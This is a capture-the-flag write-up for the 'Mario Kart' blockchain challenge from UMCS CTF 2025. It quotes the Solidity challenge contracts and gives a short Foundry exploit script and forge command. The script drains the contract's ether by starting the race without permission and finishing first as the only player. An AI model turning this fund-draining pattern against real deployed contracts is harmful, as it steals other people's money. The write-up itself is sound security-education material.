# 🚩 Mario Kart – Easy

- **Category:** Blockchain
- **CTF Event:** UMCS CTF 2025
- **Difficulty:** Easy

---

## Challenge Files

- [`MarioKart.sol`](src/MarioKart.sol)
- [`Setup.sol`](src/Setup.sol)

---

## Objective

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./MarioKart.sol";

contract Setup {
    MarioKart public marioKart;
    address public deployer;
    bool public challengeSolved;

    constructor() payable {
        require(msg.value == 20 ether, "Setup needs 20 ether");
        deployer = msg.sender;
        marioKart = new MarioKart{value: 20 ether}();
        marioKart.enableSpecialItems();
    }

    function isSolved() public view returns (bool) {
        return address(marioKart).balance == 0;
    }

    function getMainContract() public view returns (address) {
        return address(marioKart);
    }
}
```

The main goal is to drain the balance of ETH in the `marioKart` to `0` as required in the `isSolved()` function in the `Setup` contract.

---

## Code Analysis

### `MarioKart.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract MarioKart {
    struct Racer {
        string character;
        uint position;
        uint speed;
        bool hasItem;
        bool finished;
    }

    address public gameOwner;
    bool public raceStarted;
    bool public raceFinished;
    address[] public players;
    mapping(address => Racer) public racers;
    mapping(uint => address) public rankings;
    uint public finisherCount;
    uint public raceDistance = 1000;
    uint public constant ENTRY_FEE = 1 ether;
    
 
    uint public constant MUSHROOM_PRICE = 0.1 ether;
    uint public constant STAR_PRICE = 0.5 ether;
    bool public specialItemsEnabled;
    
    event RacerJoined(address player, string character);
    event RaceStarted();
    event RacerMoved(address player, uint newPosition);
    event ItemUsed(address player, address target);
    event RacerFinished(address player, uint rank);
    event RaceFinished();
    event PrizeAwarded(address winner, uint amount);
    event PowerUpPurchased(address player, string powerType);

    constructor() payable {
        require(msg.value == 20 ether, "Must initialize with 20 ether");
        gameOwner = msg.sender;
        raceStarted = false;
        raceFinished = false;
        finisherCount = 0;
        specialItemsEnabled = false; 
    }

    function joinRace(string memory character) external payable {
        require(!raceStarted, "Race already started");
        require(racers[msg.sender].position == 0, "Already joined race");
        require(msg.value == ENTRY_FEE, "Must pay 1 ether to join");
        
        racers[msg.sender] = Racer({
            character: character,
            position: 0,
            speed: 10,
            hasItem: false,
            finished: false
        });
        
        players.push(msg.sender);
        emit RacerJoined(msg.sender, character);
    }

    function startRace() external {
        require(!raceStarted, "Race already started");
        raceStarted = true;
        emit RaceStarted();
    }
    
    function enableSpecialItems() external {
        specialItemsEnabled = true;
    }

    function accelerate() external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        Racer storage racer = racers[msg.sender];
        racer.position += racer.speed;
        
        if (!racer.hasItem && uint(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 5 == 0) {
            racer.hasItem = true;
        }
        
        emit RacerMoved(msg.sender, racer.position);
        
        if (racer.position >= raceDistance) {
            racer.finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }

    function useItem(address target) external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        require(racers[msg.sender].hasItem, "No item to use");
        require(racers[target].position > 0, "Target not in race");
        require(!racers[target].finished, "Target already finished");
        
        racers[target].speed = racers[target].speed > 5 ? racers[target].speed - 5 : 1;
        racers[msg.sender].hasItem = false;
        
        emit ItemUsed(msg.sender, target);
    }

    function boost() external {
        require(raceStarted, "Race not started");
        require(!raceFinished, "Race already finished");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].speed += 5;
        
        racers[msg.sender].position += racers[msg.sender].speed;
        racers[msg.sender].speed -= 5;
        
        emit RacerMoved(msg.sender, racers[msg.sender].position);
        
        if (racers[msg.sender].position >= raceDistance) {
            racers[msg.sender].finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }
    
    function buyMushroomPowerup() external payable {
        require(specialItemsEnabled, "Special items not enabled");
        require(msg.value == MUSHROOM_PRICE, "Must pay 0.1 ether for Mushroom");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].position += 50;
        
        emit PowerUpPurchased(msg.sender, "Mushroom");
        
        if (racers[msg.sender].position >= raceDistance) {
            racers[msg.sender].finished = true;
            rankings[finisherCount] = msg.sender;
            finisherCount++;
            emit RacerFinished(msg.sender, finisherCount);
            
            if (finisherCount == 1) {
                uint prize = address(this).balance;
                (bool success, ) = msg.sender.call{value: prize}("");
                require(success, "Prize transfer failed");
                emit PrizeAwarded(msg.sender, prize);
            }
            
            if (finisherCount == players.length) {
                raceFinished = true;
                emit RaceFinished();
            }
        }
    }
    
    function buyStarPowerup() external payable {
        require(specialItemsEnabled, "Special items not enabled");
        require(msg.value == STAR_PRICE, "Must pay 0.5 ether for Star");
        require(!racers[msg.sender].finished, "Racer already finished");
        
        racers[msg.sender].speed += 20;
        
        emit PowerUpPurchased(msg.sender, "Star");
    }

    function getRacerPosition(address player) external view returns (uint) {
        return racers[player].position;
    }

    function getRacerSpeed(address player) external view returns (uint) {
        return racers[player].speed;
    }

    function getRacerHasItem(address player) external view returns (bool) {
        return racers[player].hasItem;
    }

    function getPlayerCount() external view returns (uint) {
        return players.length;
    }

    function getRacerCharacter(address player) external view returns (string memory) {
        return racers[player].character;
    }

    function getRacer(address player) external view returns (Racer memory) {
        return racers[player];
    }

    function getLeaderboard() external view returns (address[] memory) {
        address[] memory leaderboard = new address[](finisherCount);
        for (uint i = 0; i < finisherCount; i++) {
            leaderboard[i] = rankings[i];
        }
        return leaderboard;
    }

    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }
    
    function getSpecialItemsEnabled() external view returns (bool) {
        return specialItemsEnabled;
    }
} 
```

The MarioKart contract simulates a blockchain-based racing game where players pay 1 ether to join, then race to reach a distance of `1000` units. The contract manages player state, race progress, and prize distribution. Players join by calling `joinRace` with 1 ether and a character name. Each player is tracked in a Racer struct. Before starting the race, the players (racers) are not able to call the `accelerate()` or `boost()` functions to increase their position. In the `accelerate()` and `boost()` functions define that the first player that reach or exceed `1000` units of distance will receive the contract’s entire ether balance as a prize.

---

## Exploitation

To solve the challenge, you only need a single player. The exploit script joins the race, starts it by calling `startRace()`, and then repeatedly calls `accelerate()` to quickly reach the finish line. Since the contract awards the entire balance to the first finisher, you can drain all ETH from the contract by being the only participant and finishing first. No special items or advanced tricks are required—just brute force movement.

```solidity
function run() external {
    vm.startBroadcast();
    marioKart = MarioKart(vm.envAddress("MK")); // Replace with actual contract address
    marioKart.joinRace{value: 1 ether}("Mario");
    marioKart.startRace();
    for(uint256 i= 1; i <= 100; i++){
        marioKart.accelerate();
    }
    vm.stopBroadcast();
}
```

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Script

```bash
forge script script/Exploit.s.sol:Exploit --broadcast --rpc-url $RPC_URL --private-key $PK
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---